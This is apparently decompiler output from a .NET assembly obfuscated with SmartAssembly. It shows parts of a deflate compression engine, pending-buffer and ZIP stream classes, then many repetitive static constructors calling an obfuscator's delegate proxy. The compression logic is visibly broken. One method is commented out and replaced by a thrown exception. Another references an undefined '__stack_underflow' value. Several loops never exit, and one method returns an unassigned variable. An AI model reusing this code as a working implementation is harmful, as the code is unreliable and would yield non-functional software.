    // local4 = local4 + 1;
    // if (this.window[local3 + 1] == this.window[local4 + 1])
    // {
    // local3 = local3 + 1;
    // local4 = local4 + 1;
    // if (this.window[local3 + 1] == this.window[local4 + 1])
    // {
    // local3 = local3 + 1;
    // local4 = local4 + 1;
    // if (!(this.window[local3 + 1] != this.window[local4 + 1] || local3 >= local8))
    // {
    // continue;
    // }
    // break;
    // }
    // break;
    // }
    // break;
    // }
    // break;
    // }
    // break;
    // }
    // break;
    // }
    // break;
    // }
    // }
    // if (local3 <= local5)
    // {
    // IL_0210:;
    // local3 = this.strstart;
    // goto IL_0217;
    // }
    // else
    // {
    // this.matchStart = curMatch;
    // local5 = local3;
    // local6 = local3 - this.strstart;
    // if (local6 < local1)
    // {
    // local9 = this.window[local5 - 1];
    // local10 = this.window[local5];
    // goto IL_0210;
    // }
    // break;
    // }
    // break;
    // }
    // }
    // this.matchLen = System.Math.Min(local6, this.lookahead);
    // return (this.matchLen < 3) == false;
    throw new System.NotSupportedException("disrobe: unstructured control flow has no legal target scope");
}
// DeflaterEngine
private bool DeflateSlow(bool flush, bool finish)
{
    int local0;
    int local1;
    int local2;
    int local3;
    bool local4;

    if (!(this.lookahead >= 262 || flush))
    {
        return false;
    }
    while (true)
    {
        if ((((this.lookahead < 262) == false) | flush) != 0)
        {
            if (this.lookahead != 0)
            {
                if (this.strstart >= 65274)
                {
                    this.SlideWindow();
                }
                local0 = this.matchStart;
                local1 = this.matchLen;
                if (this.lookahead >= 3)
                {
                    local2 = this.InsertString();
                    if (!(((((local2 == 0 || (this.strstart - local2) > 32506) || !this.FindLongestMatch(local2)) || this.matchLen > 5) || this.matchLen != 3) || (this.strstart - this.matchStart) <= 4096))
                    {
                        this.matchLen = 2;
                    }
                }
                if (local1 < 3 || this.matchLen > local1)
                {
                    if (!(!this.prevAvailable))
                    {
                        this.huffman.TallyLit(this.window[this.strstart - 1] & 255);
                    }
                    this.prevAvailable = true;
                    this.strstart = this.strstart + 1;
                    this.lookahead = this.lookahead - 1;
                }
                else
                {
                    this.huffman.TallyDist((this.strstart - 1) - local0, local1);
                    local1 = local1 - 2;
                    while (true)
                    {
                        this.strstart = this.strstart + 1;
                        this.lookahead = this.lookahead - 1;
                        if (this.lookahead >= 3)
                        {
                            this.InsertString();
                        }
                    }
                    this.strstart = this.strstart + 1;
                    this.lookahead = this.lookahead - 1;
                    this.prevAvailable = false;
                    this.matchLen = 2;
                }
                if (!this.huffman.IsFull())
                {
                    continue;
                }
                local3 = this.strstart - this.blockStart;
                if (!(!this.prevAvailable))
                {
                    local3 = local3 - 1;
                }
                if (!finish || this.lookahead != 0)
                {
                }
                local4 = __stack_underflow;
                this.huffman.FlushBlock(this.window, this.blockStart, local3, local4);
                this.blockStart = this.blockStart + local3;
                return local4 == false;
            }
            if (!(!this.prevAvailable))
            {
                this.huffman.TallyLit(this.window[this.strstart - 1] & 255);
            }
            this.prevAvailable = false;
            this.huffman.FlushBlock(this.window, this.blockStart, this.strstart - this.blockStart, finish);
            this.blockStart = this.strstart;
            return false;
        }
    }
}
// DeflaterEngine
public bool Deflate(bool flush, bool finish)
{
    bool local0;
    bool local1;

    while (true)
    {
        this.FillWindow();
        if (!flush)
        {
        }
    }
    return local0;
}
// DeflaterEngine
public void SetInput(byte[] buffer)
{
    this.inputBuf = buffer;
    this.inputOff = 0;
    this.inputEnd = (int)buffer.Length;
    return;
}
// DeflaterEngine
public bool NeedsInput()
{
    return this.inputEnd == this.inputOff;
}
// DeflaterPending
public void WriteShort(int s)
{
    int local0;

    local0 = this.end;
    this.end = local0 + 1;
    this.buf[local0] = (byte)s;
    local0 = this.end;
    this.end = local0 + 1;
    this.buf[local0] = (byte)(s >> 8);
    return;
}
// DeflaterPending
public void WriteBlock(byte[] block, int offset, int len)
{
    System.Array.Copy(block, offset, this.buf, this.end, len);
    this.end = this.end + len;
    return;
}
// DeflaterPending
public int get_BitCount()
{
    return this.bitCount;
}
// DeflaterPending
public void AlignToByte()
{
    int local0;

    if (this.bitCount > 0)
    {
        local0 = this.end;
        this.end = local0 + 1;
        this.buf[local0] = (byte)this.bits;
        if (this.bitCount > 8)
        {
            local0 = this.end;
            this.end = local0 + 1;
            this.buf[local0] = (byte)(this.bits >>> 8);
        }
    }
    this.bits = 0;
    this.bitCount = 0;
    return;
}
// DeflaterPending
public void WriteBits(int b, int count)
{
    int local0;

    this.bits = this.bits | (b << (this.bitCount & 31));
    this.bitCount = this.bitCount + count;
    if (this.bitCount >= 16)
    {
        local0 = this.end;
        this.end = local0 + 1;
        this.buf[local0] = (byte)this.bits;
        local0 = this.end;
        this.end = local0 + 1;
        this.buf[local0] = (byte)(this.bits >>> 8);
        this.bits = this.bits >>> 16;
        this.bitCount = this.bitCount - 16;
    }
    return;
}
// DeflaterPending
public bool get_IsFlushed()
{
    return this.end == 0;
}
// DeflaterPending
public int Flush(byte[] output, int offset, int length)
{
    int local0;

    if (this.bitCount >= 8)
    {
        local0 = this.end;
        this.end = local0 + 1;
        this.buf[local0] = (byte)this.bits;
        this.bits = this.bits >>> 8;
        this.bitCount = this.bitCount - 8;
    }
    if (length <= (this.end - this.start))
    {
        System.Array.Copy(this.buf, this.start, output, offset, length);
        this.start = this.start + length;
    }
    else
    {
        length = this.end - this.start;
        System.Array.Copy(this.buf, this.start, output, offset, length);
        this.start = 0;
        this.end = 0;
    }
    return length;
}
// DeflaterPending
public void .ctor()
{
    this.buf = new System.Byte[65536];
    return;
}
// ZipStream
public void WriteShort(int value)
{
    this.WriteByte((byte)(value & 255));
    this.WriteByte((byte)((value >> 8) & 255));
    return;
}
// ZipStream
public void WriteInt(int value)
{
    this.WriteShort(value);
    this.WriteShort(value >> 16);
    return;
}
// ZipStream
public int ReadShort()
{
    return this.ReadByte() | (this.ReadByte() << 8);
}
// ZipStream
public int ReadInt()
{
    return this.ReadShort() | (this.ReadShort() << 16);
}
// ZipStream
public void .ctor()
{
    return;
}
// ZipStream
public void .ctor(byte[] buffer)
{
    this.ctor(buffer, false);
    return;
}
// SmartAssembly.Attributes.PoweredByAttribute
public void .ctor(string arg1)
{
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(54);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(55);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(56);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(57);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(58);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(59);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(60);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(61);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(62);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(63);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(64);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(65);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(66);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(67);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(68);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(69);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(70);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(71);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(72);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(73);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(74);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(75);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(76);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(77);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(78);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(79);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(80);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(81);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(82);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(83);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(84);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(85);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(86);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(87);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(88);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(89);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(90);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(91);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(92);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(93);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(94);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(95);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(96);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(97);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(98);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(99);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(100);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(101);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(102);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(103);
    return;
}
// 
static void .cctor()
{
    SmartAssembly.HouseOfCards.MemberRefsProxy.CreateMemberRefsDelegates(104);
    return;
}
